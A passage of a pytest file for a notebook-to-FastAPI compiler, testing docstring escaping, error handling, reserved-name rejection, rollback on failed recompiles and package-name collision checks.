    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "from typing import Literal\n\n"
            "def classify_sync(x: int) -> "
            'Literal["a\\"quoted\\"value"]:\n'
            '    return "a\\"quoted\\"value"\n\n'
            "def process_classify(x: int) -> "
            'Literal["a\\"quoted\\"value"]:\n'
            '    return "a\\"quoted\\"value"\n'
        )
    )

    notebook_path = tmp_path / "quoted_return_type.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")

    ast.parse(generated_app)
    compile(generated_app, "app.py", "exec")


def test_compiler_pipeline_function_docstring_becomes_the_endpoint_description(
    tmp_path,
):
    """Before this fix, extract_functions_from_code (parser/ast_parser.py)
    never even extracted a function's own docstring, so it was always
    discarded no matter what a notebook author wrote -- every endpoint's
    OpenAPI description was the same generic templated sentence
    ("Auto-generated endpoint for <name>. Operation ID: <name>.
    Parameters: <names>."), regardless of how much real documentation the
    author had already written directly on the function.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            '    """Add two numbers and return their sum."""\n'
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app

schema = app.openapi()
description = schema["paths"]["/add"]["post"]["description"]
assert description == "Add two numbers and return their sum.", description

print("DOCSTRING_DESCRIPTION_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "DOCSTRING_DESCRIPTION_E2E_OK" in proc.stdout


def test_compiler_pipeline_function_without_docstring_keeps_the_auto_generated_description(
    tmp_path,
):
    """A function with no docstring must keep getting the previous
    behavior's auto-generated description -- this feature is additive,
    not a replacement for every endpoint's docs.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app

schema = app.openapi()
description = schema["paths"]["/add"]["post"]["description"]
assert description == (
    "Auto-generated endpoint for add. Operation ID: add. "
    "Parameters: a, b."
), description

print("AUTO_DESCRIPTION_FALLBACK_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "AUTO_DESCRIPTION_FALLBACK_E2E_OK" in proc.stdout


def test_compiler_pipeline_docstring_containing_quotes_and_newlines_compiles_end_to_end(
    tmp_path,
):
    """Mirrors
    test_compiler_pipeline_parameter_type_containing_a_quote_compiles_end_to_end
    for the same unescaped-embedding hazard, now on a function's own
    docstring: it's arbitrary, notebook-author-controlled text that can
    legitimately contain a double quote, a backslash, or span multiple
    lines. Before description was repr()'d rather than embedded as a raw
    f-string, any of those would close the description="..." literal
    early and corrupt the whole @app.post(...) call into a SyntaxError,
    failing the entire compile over a single endpoint's docs. Covers both
    the synchronous and background/task_id code paths, since each builds
    this @app.post(...) call separately.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def classify_sync(x: int) -> str:\n"
            '    """Classify x as "high" or "low".\n\n'
            "    Uses a backslash \\\\ in this line too.\n"
            '    """\n'
            '    return "high"\n\n'
            "def process_classify(x: int) -> str:\n"
            '    """Classify x as "high" or "low" (background version)."""\n'
            '    return "high"\n'
        )
    )

    notebook_path = tmp_path / "quoted_docstring.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")

    ast.parse(generated_app)
    compile(generated_app, "app.py", "exec")


def test_compiler_pipeline_sync_endpoint_reports_a_raised_exception_as_a_clean_500(
    tmp_path,
):
    """Confirmed exploitable before this fix: a synchronous notebook
    function raising an exception (a ZeroDivisionError here, but any bug
    or a legitimately bad input Pydantic's own type validation can't
    catch -- a KeyError, a bad file path, ...) propagated straight out of
    the endpoint unhandled, crashing with a bare, detail-free "Internal
    Server Error" -- exactly the gap _run_background_task already closed
    for the background/task_id path (it reports the task "failed" with
    str(e) instead of leaving it stuck forever), but with no equivalent
    on the synchronous path at all.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def divide(a: int, b: int) -> float:\n"
                            "    return a / b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

# raise_server_exceptions=False so this behaves like a real deployment
# (Starlette's ServerErrorMiddleware catching the unhandled exception)
# instead of TestClient re-raising it into this test process.
client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

resp = client.post("/divide", json={{"a": 5, "b": 0}}, headers=headers)
assert resp.status_code == 500, resp.text
assert "divide" in resp.text
assert "ZeroDivisionError" in resp.text

print("SYNC_RAISED_EXCEPTION_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "SYNC_RAISED_EXCEPTION_E2E_OK" in proc.stdout


def test_compiler_pipeline_sync_endpoint_lets_a_deliberate_httpexception_through_unwrapped(
    tmp_path,
):
    """A notebook function that imports fastapi itself and deliberately
    raises an HTTPException (e.g. to signal its own 404/403/409) is
    choosing that status code and message on purpose -- it must reach the
    caller as-is, not get swallowed into a generic 500 by the same
    except-Exception block that now catches everything else.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "from fastapi import HTTPException\n\n"
                            "def lookup(item_id: int) -> int:\n"
                            "    raise HTTPException(status_code=404, detail='item not found')\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

resp = client.post("/lookup", json={{"item_id": 1}}, headers=headers)
assert resp.status_code == 404, resp.text
assert resp.json() == {{"detail": "item not found"}}, resp.json()

print("SYNC_DELIBERATE_HTTPEXCEPTION_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "SYNC_DELIBERATE_HTTPEXCEPTION_E2E_OK" in proc.stdout


def test_compiler_pipeline_sync_endpoint_with_unserializable_result_returns_a_clean_500(
    tmp_path,
):
    """Mirrors
    test_compiler_pipeline_background_task_with_unserializable_result_is_reported_as_failed
    for a synchronous (non-background) endpoint. Confirmed exploitable
    before this fix: a synchronous function returning something FastAPI's
    response serialization can't encode (e.g. a complex number -- Python
    builtin, no extra dependency needed to demonstrate this; a raw numpy
    array or pandas DataFrame is the more common real-world case for
    "compute_stats" but requires numpy as a test dependency this project
    doesn't otherwise have) crashed with an unhandled ValueError deep
    inside FastAPI's routing internals -- which a real (non-test-client)
    deployment surfaces to the caller as a bare "Internal Server Error"
    with no detail at all, unlike every other failure mode this
    generated app already reports clearly (auth, reserved names,
    oversized bodies, ...).
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def compute_stats(x: int) -> object:\n"
                            "    return object()\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

# raise_server_exceptions=False so this behaves like a real deployment
# (Starlette's ServerErrorMiddleware catching an unhandled exception and
# turning it into a plain 500) instead of TestClient re-raising it into
# this test process.
client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

resp = client.post("/compute_stats", json={{"x": 5}}, headers=headers)
assert resp.status_code == 500, resp.text
assert "compute_stats" in resp.text
assert "not JSON-serializable" in resp.text

print("SYNC_UNSERIALIZABLE_RESULT_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "SYNC_UNSERIALIZABLE_RESULT_E2E_OK" in proc.stdout


def test_compiler_pipeline_sync_endpoint_result_is_run_through_jsonable_encoder(
    tmp_path,
):
    """Mirrors
    test_compiler_pipeline_background_task_result_is_run_through_jsonable_encoder
    for a synchronous endpoint: a type json.dumps alone can't handle (a
    datetime) must still be delivered correctly, converted into JSON-safe
    data rather than merely happening not to break on it.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "import datetime\n\n"
                            "def report(year: int) -> dict:\n"
                            "    return {\n"
                            "        'year': year,\n"
                            "        'generated_on': datetime.date(2024, 1, 1),\n"
                            "    }\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

resp = client.post("/report", json={{"year": 2024}}, headers=headers)
assert resp.status_code == 200, resp.text
assert resp.json() == {{"result": {{"year": 2024, "generated_on": "2024-01-01"}}}}, resp.json()

print("SYNC_JSONABLE_ENCODER_RESULT_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "SYNC_JSONABLE_ENCODER_RESULT_E2E_OK" in proc.stdout


def test_compiler_pipeline_rejects_notebook_function_named_verify_api_key(tmp_path):
    """Confirmed exploitable before this fix: a notebook function named
    verify_api_key rebinds the generated app's own auth-check function at
    module load time, silently disabling API-key authentication for every
    endpoint defined after it. compile_notebook must fail loudly instead
    of producing that app.
    """
    from backend.generator.api_generator import ReservedFunctionNameError

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def verify_api_key() -> dict:\n"
            "    return {'ok': True}\n"
        )
    )

    notebook_path = tmp_path / "reserved.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    with pytest.raises(ReservedFunctionNameError):
        compile_notebook(str(notebook_path), str(output_dir))


def test_compiler_pipeline_accepts_parameters_named_like_pydantic_model_attributes(tmp_path):
    """Parameters named json/schema/copy/dict/validate/model_config/
    model_dump are ordinary in a notebook (`def convert(json)`), but can't be
    Pydantic model fields. They used to be refused outright with a
    ReservedParameterNameError; they now live under an aliased attribute so the
    request body, schema and function call all keep the real name."""
    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps({
            "nbformat": 4,
            "nbformat_minor": 5,
            "metadata": {},
            "cells": [{
                "cell_type": "code", "execution_count": None, "metadata": {}, "outputs": [],
                "source": (
                    "def convert(json: str, schema: int = 2, copy: bool = False, dict: list = [1],\n"
                    "            validate: bool = True, model_config: str = 'm', *, model_dump: int = 5) -> str:\n"
                    "    return f'{json}|{schema}|{copy}|{dict}|{validate}|{model_config}|{model_dump}'\n"
                ),
            }],
        }),
        encoding="utf-8",
    )

    script = f"""
import sys

sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "generated")

from generated.app import app
from fastapi.testclient import TestClient

client = TestClient(app, raise_server_exceptions=False)
headers = {{"X-API-Key": "notebook-to-api-dev-key"}}

assert client.post("/convert", json={{"json": "j"}}, headers=headers).json() == {{"result": "j|2|False|[1]|True|m|5"}}
full = {{"json": "j", "schema": 9, "copy": True, "dict": [3], "validate": False, "model_config": "x", "model_dump": 1}}
assert client.post("/convert", json=full, headers=headers).json() == {{"result": "j|9|True|[3]|False|x|1"}}
# `json` has no default, so it is still required.
assert client.post("/convert", json={{}}, headers=headers).status_code == 422

schema = client.get("/openapi.json").json()["components"]["schemas"]["ConvertRequest"]
assert list(schema["properties"]) == ["json", "schema", "copy", "dict", "validate", "model_config", "model_dump"]
print("RESERVED_PARAM_NAMES_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "RESERVED_PARAM_NAMES_E2E_OK" in proc.stdout


def test_field_name_aliases_reserved_pydantic_names():
    from backend.generator.api_generator import _field_name

    assert _field_name({"name": "json"}) == "p_json"
    assert _field_name({"name": "model_config"}) == "p_model_config"
    assert _field_name({"name": "model_id"}) == "model_id"
    assert _field_name({"name": "_x"}) == "p_x"


def test_compiler_pipeline_allows_a_model_prefixed_parameter_name_that_does_not_collide(
    tmp_path,
):
    """"model_id"/"model_type" and the like are entirely ordinary
    parameter names for this ML/data-tooling-oriented compiler -- only a
    name that collides with a *real* pydantic.BaseModel attribute (see
    RESERVED_PYDANTIC_FIELD_NAMES) is rejected, not every "model_"-
    prefixed name.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def process(model_id: str) -> str:\n"
            "    return model_id\n"
        )
    )

    notebook_path = tmp_path / "not_reserved_param.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    assert (output_dir / "app.py").exists()


def test_compiler_pipeline_rejects_notebook_function_named_evict_expired_tasks(
    tmp_path,
):
    """Confirmed exploitable before this fix: a notebook function named
    _evict_expired_tasks silently overwrote the generated app's own
    module-level helper of that name at import time -- and broke every
    *other* background endpoint's own submission, not just this one's,
    since each one calls this exact now-shadowed name before enqueuing a
    new task. Reproduced directly against a real compiled+running app: a
    completely unrelated `train_model` background endpoint crashed with
    "TypeError: _evict_expired_tasks() missing 1 required positional
    argument" the moment it tried to submit a task, nothing to do with
    train_model's own logic at all. compile_notebook must fail loudly
    instead of producing that app.
    """
    from backend.generator.api_generator import ReservedFunctionNameError

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def _evict_expired_tasks(x: int) -> int:\n"
            "    return x\n\n"
            "def train_model(epochs: int) -> str:\n"
            "    return 'done'\n"
        )
    )

    notebook_path = tmp_path / "reserved_helper.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    with pytest.raises(ReservedFunctionNameError):
        compile_notebook(str(notebook_path), str(output_dir))


def test_compiler_pipeline_leaves_a_previous_successful_compile_untouched_on_failure(
    tmp_path
):
    """Confirmed exploitable before this fix: generate_fastapi_code (and
    the ReservedFunctionNameError it can raise) previously ran *after*
    write_runtime_module and write_requirements had already overwritten
    the runtime module and requirements.txt from a working previous
    compile with content generated from the *failing* notebook -- while
    app.py, the Dockerfile, and .compile_metadata.json were left
    untouched from that previous compile. A failed recompile (e.g. a typo
    that introduces a reserved-name collision) left output_dir in an
    inconsistent state matching neither the old nor the new notebook,
    with app.py expecting functions the runtime module no longer defined.
    """
    from backend.generator.api_generator import ReservedFunctionNameError

    good_notebook = nbformat.v4.new_notebook()
    good_notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(good_notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    runtime_path = output_dir / "runtime" / "notebook_module.py"
    requirements_path = output_dir / "requirements.txt"
    metadata_path = output_dir / ".compile_metadata.json"
    app_path = output_dir / "app.py"

    runtime_before = runtime_path.read_text(encoding="utf-8")
    requirements_before = requirements_path.read_text(encoding="utf-8")
    metadata_before = metadata_path.read_text(encoding="utf-8")
    app_before = app_path.read_text(encoding="utf-8")

    bad_notebook = nbformat.v4.new_notebook()
    bad_notebook.cells.append(
        nbformat.v4.new_code_cell(
            "import json\n\n"
            "def health_check() -> dict:\n    return {}\n"
        )
    )
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(bad_notebook, f)

    with pytest.raises(ReservedFunctionNameError):
        compile_notebook(str(notebook_path), str(output_dir))

    # Every artifact from the previous successful compile must be
    # completely untouched -- not just individually valid, but an exact
    # match for the working app that was there before the failed attempt.
    assert runtime_path.read_text(encoding="utf-8") == runtime_before
    assert requirements_path.read_text(encoding="utf-8") == requirements_before
    assert metadata_path.read_text(encoding="utf-8") == metadata_before
    assert app_path.read_text(encoding="utf-8") == app_before


def test_clear_stale_export_artifacts_removes_openapi_and_sdk_files(tmp_path):

    (tmp_path / "openapi.json").write_text("{}", encoding="utf-8")
    (tmp_path / "openapi.yaml").write_text("{}", encoding="utf-8")
    sdk_dir = tmp_path / "sdk"
    sdk_dir.mkdir()
    (sdk_dir / "python_client.py").write_text("# client", encoding="utf-8")

    clear_stale_export_artifacts(str(tmp_path))

    assert not (tmp_path / "openapi.json").exists()
    assert not (tmp_path / "openapi.yaml").exists()
    assert not sdk_dir.exists()


def test_clear_stale_export_artifacts_is_a_no_op_when_nothing_was_ever_exported(
    tmp_path,
):
    # Must not raise just because there was never a prior export to clear.
    clear_stale_export_artifacts(str(tmp_path))


def test_compiler_pipeline_recompile_clears_a_stale_exported_openapi_and_sdk(
    tmp_path,
):
    """Confirmed exploitable before this fix: POST /api/export-openapi and
    POST /api/export-sdk (and the CLI's export-openapi/export-sdk
    commands) write openapi.json/openapi.yaml/sdk/ straight into
    output_dir, alongside the compiled app -- but recompiling the
    notebook only ever overwrote app.py, the runtime module,
    requirements.txt, and the Dockerfile, leaving any previously exported
    openapi.json/openapi.yaml/sdk/ completely untouched. A caller
    downloading the "compiled app" afterwards (GET /api/download, or GET
    /api/generated/openapi.json) got a schema/SDK describing the
    *previous* compile's endpoints, silently mismatched against the
    app.py sitting right next to it in the same directory.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    # Simulate a prior POST /api/export-openapi + POST /api/export-sdk
    # against this compile, without actually dynamically importing the
    # compiled app module (which export_openapi_schema does, and which
    # this project's own SDK tests deliberately run out-of-process to
    # avoid caching across tests in the same pytest process -- irrelevant
    # to what's being tested here, which is only whether a recompile
    # clears these files out, not what they contain).
    (output_dir / "openapi.json").write_text(
        json.dumps({"paths": {"/add": {}}}), encoding="utf-8"
    )
    (output_dir / "openapi.yaml").write_text("paths:\n  /add: {}\n", encoding="utf-8")
    sdk_dir = output_dir / "sdk"
    sdk_dir.mkdir()
    (sdk_dir / "python_client.py").write_text(
        "def add(self, payload): ...\n", encoding="utf-8"
    )

    other_notebook = nbformat.v4.new_notebook()
    other_notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def multiply(a: int, b: int) -> int:\n    return a * b\n"
        )
    )
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(other_notebook, f)

    compile_notebook(str(notebook_path), str(output_dir))

    app_source = (output_dir / "app.py").read_text(encoding="utf-8")
    assert "def multiply(" in app_source
    assert "def add(" not in app_source

    assert not (output_dir / "openapi.json").exists()
    assert not (output_dir / "openapi.yaml").exists()
    assert not sdk_dir.exists()


def test_compiler_pipeline_failed_recompile_leaves_stale_exports_untouched(tmp_path):
    """Mirrors
    test_compiler_pipeline_leaves_a_previous_successful_compile_untouched_on_failure
    for export artifacts specifically: a compile that fails (e.g. a
    reserved-name collision) must leave a previous compile's exported
    openapi.json/sdk/ untouched too, the same as it already leaves
    app.py/requirements.txt/the runtime module untouched -- clearing
    stale exports only makes sense once a new, actually-successful
    compile exists to replace what they described.
    """
    from backend.generator.api_generator import ReservedFunctionNameError

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    openapi_path = output_dir / "openapi.json"
    openapi_path.write_text(json.dumps({"paths": {"/add": {}}}), encoding="utf-8")
    sdk_dir = output_dir / "sdk"
    sdk_dir.mkdir()
    (sdk_dir / "python_client.py").write_text("# client", encoding="utf-8")

    bad_notebook = nbformat.v4.new_notebook()
    bad_notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def health_check() -> dict:\n    return {}\n"
        )
    )
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(bad_notebook, f)

    with pytest.raises(ReservedFunctionNameError):
        compile_notebook(str(notebook_path), str(output_dir))

    assert openapi_path.exists()
    assert sdk_dir.exists()


def test_compiler_pipeline_case_colliding_function_names_get_distinct_models(tmp_path):
    """Confirmed exploitable before this fix: two notebook functions
    differing only by the case of their first letter (e.g. "get_data" and
    "Get_data") produced identically-named Pydantic request model classes,
    so the second class definition silently shadowed the first -- one
    endpoint ended up validating requests against the *other* function's
    fields.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def get_data(query: str) -> dict:\n"
            "    return {'query': query}\n"
        )
    )
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def Get_data(id: int) -> dict:\n"
            "    return {'id': id}\n"
        )
    )

    notebook_path = tmp_path / "collide.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")

    ast.parse(generated_app)
    compile(generated_app, "app.py", "exec")

    assert generated_app.count("class Get_dataRequest(BaseModel):") == 1
    assert generated_app.count("class Get_dataRequest_2(BaseModel):") == 1


def test_package_name_for_output_dir_uses_basename():

    assert package_name_for_output_dir("generated") == "generated"
    assert package_name_for_output_dir("my_output") == "my_output"
    assert package_name_for_output_dir("build/my_output") == "my_output"


def test_package_name_for_output_dir_rejects_invalid_identifier():

    with pytest.raises(ValueError):
        package_name_for_output_dir("my-output")


def test_package_name_for_output_dir_rejects_python_keyword():

    with pytest.raises(ValueError):
        package_name_for_output_dir("import")


@pytest.mark.parametrize("stdlib_name", ["json", "os", "sys", "time", "re"])
def test_package_name_for_output_dir_rejects_a_standard_library_module_name(
    stdlib_name,
):
    """Confirmed exploitable before this fix: `--output json` (or any
    real standard-library module name) passed this function's own
    isidentifier()/keyword checks fine and compiled without error, but
    the generated app.py's `import json.runtime.notebook_module as
    notebook_module` statement then resolved to the real, already-
    imported stdlib `json` module instead of the locally compiled
    package -- Python's import system finds a standard-library module
    ahead of a same-named package under the working directory. The
    generated app was entirely unusable (`python -m uvicorn json.app:app`
    -- what `serve`, the generated Dockerfile's CMD, and any real
    deployment all run -- failed with "No module named 'json.app'"),
    with the failure only ever surfacing later, disconnected from the
    --output choice that actually caused it.
    """

    with pytest.raises(ValueError, match="standard library module"):
        package_name_for_output_dir(stdlib_name)


def test_package_name_for_output_dir_allows_a_name_that_merely_looks_like_a_builtin():
    """Only real *importable modules* collide this way -- "list"/"dict"/
    "str" are builtin *types*, not modules, so there's no standard-
    library module for `import list.runtime.notebook_module` to
    incorrectly resolve to instead.
    """

    assert package_name_for_output_dir("list") == "list"


@pytest.mark.parametrize("installed_package_name", ["fastapi", "pytest", "httpx"])
def test_package_name_for_output_dir_rejects_an_installed_third_party_package_name(
    installed_package_name,
):
    """Confirmed exploitable before this fix: `--output fastapi` (or any
    other package genuinely `pip install`ed in the compiling environment
    -- fastapi/pytest/httpx are all in this project's own requirements.txt,
    so they're guaranteed present here) passed the isidentifier()/keyword/
    STANDARD_LIBS checks fine and compiled without error, but the
    generated app.py's `import fastapi.runtime.notebook_module` statement
    then resolved to the real, already-installed `fastapi` package
    instead of the locally compiled one -- reproduced against a real
    `python -m uvicorn fastapi.app:app`, which fails outright with
    "Could not import module 'fastapi.app'" since the real package has no
    such submodule. This is the exact same import-shadowing hazard the
    standard-library check above already guards against, just for a
    third-party package instead of one built into the interpreter.
    """

    with pytest.raises(ValueError, match="already-installed"):
        package_name_for_output_dir(installed_package_name)


def test_package_name_for_output_dir_allows_a_name_with_no_installed_package():
    """A name that isn't a standard-library module and isn't an installed
    third-party package either has nothing real for
    `import <name>.runtime.notebook_module` to incorrectly resolve to, so
    it's allowed through exactly as before.
    """

    assert (
        package_name_for_output_dir("definitely_not_an_installed_package_xyz")
        == "definitely_not_an_installed_package_xyz"
    )


def test_package_name_for_output_dir_does_not_flag_this_tools_own_prior_output_dirs():
    """A directory this tool itself already compiled into (e.g.
    "generated", the documented default) is a real, on-disk Python
    package the moment it exists -- but it was never `pip install`ed, so
    it must not trip the installed-third-party-package check above. Using
    importlib.util.find_spec (which also matches local, non-installed
    directories) instead of importlib.metadata.packages_distributions()
    would have made this tool's own default --output start failing the
    very first time it was reused for a second compile.
    """

    assert package_name_for_output_dir("generated") == "generated"
    assert package_name_for_output_dir("test_generated") == "test_generated"


def test_this_tools_own_package_name_is_backend():
    """Sanity check on the constant itself: derived from __name__
    ("backend.compiler") rather than hardcoded, so it can't drift if this
    package is ever renamed -- but the collision check below is only
    meaningful if it actually resolves to the real package name.
    """

    assert THIS_TOOLS_OWN_PACKAGE_NAME == "backend"


def test_package_name_for_output_dir_rejects_this_tools_own_package_name():
    """Confirmed exploitable before this fix: `--output backend` passed
    the isidentifier()/keyword/STANDARD_LIBS/installed-third-party-package
    checks fine (this project was never `pip install`ed, so
    importlib.metadata.packages_distributions() has no metadata for
    "backend" at all -- the identical reason this tool's own prior
    --output dirs like "generated" are deliberately allowed through) and
    compiled without error -- but the generated app.py's `import
    backend.runtime.notebook_module` statement would then resolve to this
    tool's own real "backend" package instead of the locally compiled
    one. Unlike an ordinary already-installed third-party package, this
    collision isn't merely possible: backend/compiler.py (the module
    performing this very check) is part of the "backend" package, so it
    is unconditionally already imported in every single invocation of
    this tool.
    """

    with pytest.raises(ValueError, match="this tool's own top-level package"):
        package_name_for_output_dir("backend")


def test_compiler_pipeline_rejects_output_dir_colliding_with_this_tools_own_package(
    tmp_path,
):
    """End-to-end confirmation that compile_notebook itself -- not just
    the package_name_for_output_dir helper in isolation -- refuses to
    compile into an --output directory named "backend", and does so
    before writing anything.
    """

